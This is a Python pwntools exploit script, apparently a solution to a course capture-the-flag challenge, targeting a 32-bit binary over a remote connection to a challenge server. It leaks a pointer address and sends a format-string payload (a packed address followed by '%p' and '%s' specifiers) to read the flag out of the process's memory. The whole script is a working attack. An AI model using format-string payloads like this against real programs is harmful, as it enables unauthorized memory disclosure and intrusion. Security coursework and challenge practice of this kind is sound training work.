#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template exe
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("exe")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote("cs412.polygl0ts.ch", 9003)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES BRRRR
# ===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

if args.GDB:
    io.interactive()
if args.REMOTE:
    log.info(io.recv())


log.info(io.recvline())
received = io.recvline(keepends=False)
log.info(received)

# the first received value is the pointer address of the flag
addr = int(received[-8:], 16)

# we can massage the format string to build a payload
# this boug explains it quite well https://infosecwriteups.com/exploiting-format-string-vulnerability-97e3d588da1b
attack = p32(addr) + b" %p %p %p %p %p %p %s %p %p"

log.info("Payload is %s", attack)

log.info(io.recvline())

io.sendline(attack)

io.interactive()
